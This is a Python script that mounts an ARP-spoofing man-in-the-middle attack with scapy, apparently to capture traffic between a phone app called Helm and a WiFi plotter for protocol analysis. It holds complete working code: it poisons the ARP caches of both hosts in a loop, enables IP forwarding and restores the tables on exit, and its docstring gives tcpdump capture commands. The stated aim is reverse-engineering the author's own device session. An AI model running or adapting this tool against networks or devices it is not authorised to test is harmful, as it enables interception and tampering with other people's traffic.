"""ARP-spoofing MITM capture for the Helm session (no monitor mode needed).

When the phone is already paired with the plotter, the app only talks to the
*real* plotter -- so to observe that session we redirect it through the laptop
at layer 2 using ARP spoofing (active, works on normal managed WiFi; no monitor
mode, no WPA key). Traffic then routes through this machine and can be captured
on the ordinary interface.

    phone  <-->  laptop (spoofs both, forwards)  <-->  plotter

Requirements:
    * root (sudo)
    * scapy:  pip install --break-system-packages scapy
    * the WiFi AP must allow client-to-client traffic (most plotter APs do)
    * laptop, phone and plotter on the same WiFi

Usage:
    sudo python3 -m helm.arp_mitm --phone 172.16.6.5 --plotter 172.16.6.0 --iface wlan0

While it runs, capture in another terminal (the traffic now routes through you):
    sudo tcpdump -i wlan0 -w helm.pcap host 172.16.6.0
then drive Helm from the phone, stop, and:
    python3 helm-cli.py analyze helm.pcap --port 51200

This enables IP forwarding while running and restores it on exit. It only
redirects the phone<->plotter pair; it does not touch other devices.
"""

from __future__ import annotations

import argparse
import os
import signal
import subprocess
import sys
import time


def _need_scapy():
    try:
        from scapy.all import ARP, Ether, getmacbyip, sendp, srp  # noqa: F401
        return True
    except ImportError:
        print("scapy is required:  pip install --break-system-packages scapy")
        return False


def get_mac(ip: str):
    from scapy.all import ARP, Ether, srp
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 timeout=3, retry=2, verbose=False)
    for _, r in ans:
        return r.hwsrc
    return None


def spoof(target_ip, target_mac, spoof_ip, iface):
    from scapy.all import ARP, Ether, sendp
    # tell target_ip that spoof_ip is at our MAC
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                      psrc=spoof_ip)
    sendp(pkt, iface=iface, verbose=False)


def restore(a_ip, a_mac, b_ip, b_mac, iface):
    from scapy.all import ARP, Ether, sendp
    sendp(Ether(dst=a_mac) / ARP(op=2, pdst=a_ip, hwdst=a_mac, psrc=b_ip,
                                 hwsrc=b_mac), iface=iface, count=3, verbose=False)
    sendp(Ether(dst=b_mac) / ARP(op=2, pdst=b_ip, hwdst=b_mac, psrc=a_ip,
                                 hwsrc=a_mac), iface=iface, count=3, verbose=False)


def set_ip_forward(on: bool):
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1" if on else "0")


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="ARP-spoof MITM for Helm capture")
    ap.add_argument("--phone", required=True)
    ap.add_argument("--plotter", required=True)
    ap.add_argument("--iface", required=True)
    ap.add_argument("--interval", type=float, default=2.0)
    args = ap.parse_args(argv)

    if os.geteuid() != 0:
        print("Run with sudo (raw packets + ip_forward).")
        return 1
    if not _need_scapy():
        return 1

    phone_mac = get_mac(args.phone)
    plotter_mac = get_mac(args.plotter)
    if not phone_mac or not plotter_mac:
        print(f"Could not ARP-resolve one host (phone={phone_mac}, "
              f"plotter={plotter_mac}). Are they online and reachable?")
        return 1
    print(f"phone   {args.phone} = {phone_mac}")
    print(f"plotter {args.plotter} = {plotter_mac}")

    set_ip_forward(True)
    print("IP forwarding on. Spoofing... (Ctrl-C to stop and restore)")
    print("In another terminal:\n"
          f"    sudo tcpdump -i {args.iface} -w helm.pcap host {args.plotter}\n"
          "then drive Helm from the phone.")

    stop = {"v": False}
    signal.signal(signal.SIGINT, lambda *_: stop.__setitem__("v", True))
    try:
        while not stop["v"]:
            spoof(args.phone, phone_mac, args.plotter, args.iface)
            spoof(args.plotter, plotter_mac, args.phone, args.iface)
            time.sleep(args.interval)
    finally:
        print("\nrestoring ARP tables...")
        restore(args.phone, phone_mac, args.plotter, plotter_mac, args.iface)
        set_ip_forward(False)
        print("done.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
